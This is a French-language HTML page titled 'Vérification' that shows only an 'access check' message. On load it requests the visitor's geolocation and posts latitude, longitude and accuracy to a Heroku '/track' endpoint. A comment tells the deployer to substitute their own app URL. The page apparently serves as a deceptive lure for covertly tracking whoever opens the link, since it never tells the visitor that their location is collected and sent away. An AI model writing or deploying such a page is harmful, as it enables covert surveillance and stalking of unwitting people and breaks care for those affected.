<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification</title>
    <script>
        // Fonction pour obtenir la géolocalisation
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
            } else {
                alert("La géolocalisation n'est pas supportée par ce navigateur.");
            }
        }

        // Fonction pour envoyer la localisation au backend
        function sendLocation(position) {
            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };

            // Remplacer l'URL par celle de votre app Heroku
            fetch('https://shrouded-anchorage-35377.herokuapp.com/track', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => console.log("Données envoyées", data))
            .catch(error => console.error("Erreur", error));
        }

        // Gestion des erreurs liées à la géolocalisation
        function handleError(error) {
            alert("Erreur de géolocalisation : " + error.message);
        }
    </script>
</head>
<body onload="getLocation()">
    <h1>Vérification de l'accès...</h1>
</body>
</html>
